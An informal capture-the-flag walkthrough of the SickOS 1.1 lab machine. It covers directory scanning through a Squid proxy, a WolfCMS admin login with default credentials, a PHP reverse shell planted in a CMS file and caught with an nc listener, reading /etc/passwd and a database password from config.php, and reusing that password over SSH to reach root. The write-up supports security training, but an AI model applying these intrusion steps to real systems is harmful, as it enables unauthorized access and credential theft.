as we see there is a web page probably, 
but it is behind squid proxy server

https://www.hackingarticles.in/web-proxy-penetration-lab-setup-testing-using-squid/

this is a good article about squid proxy


lets to a dirb search on the url



 $ dirb http://192.168.1.8/ -p 192.168.1.8:3128

 -p indicates proxy
 
to access any of this content we need to first chnage aour browsers proxy settings

go to firefox proxy settings 

ip: 192.168.1.8  port:3128

no we can go to the url

http:://192.168.1.8

and we see the website



lets look at the robots.txt content

User-agent: *
Disallow: /
Dissalow: /wolfcms

go to the directort http://192.168.1.8/wolfcms

we may later run a dirb on this directory too

now to go /connect directory, it downloads a python script


read the connect file

$ cat connect

#!/usr/bin/python

print "I Try to connect things very frequently\n"
print "You may want to try my services"



lets run dirb on wolfcms directory

dirb http://192.168.1.8/wolfcms -p 192.168.1.8:3128


I found a bunch of diretories that lead no where

So I googled wolfcms admin login page 
and it is /wolfcms/?/admin/login


I tried admin admin
and it worked

in admin page there is an articles file and when I opened it and saw that 
it is a php file
we may inject a php reverse shell

first get the php reverse shell from pentestmonkey

and set up a nc listenere

$ nc -lnvp 4444

and now navigate to /wolfcms/articles

and we got the reverse shell

$whoami 
www-data

$cat /etc/passwd

sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash

there is a sickos user

lets see if we can own that user

now navigate to /var/www/wofcms

there is a file named config.php

$cat config.php


// Database information:
// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)
// The path can only be absolute path or :memory:
// For more info look at: www.php.net/pdo

// Database settings:
define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
define('DB_USER', 'root');
define('DB_PASS', 'john@123');
define('TABLE_PREFIX', '');

// Should Wolf produce PHP error messages for debugging?
define('DEBUG', false);


try to ssh with root user and john@123

failed

tried ssh with sickos user and john@123

we are in

$sudo -l
we are in root group

$sudo su
and we are root

$cd /root

read the flag

If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks for Trying
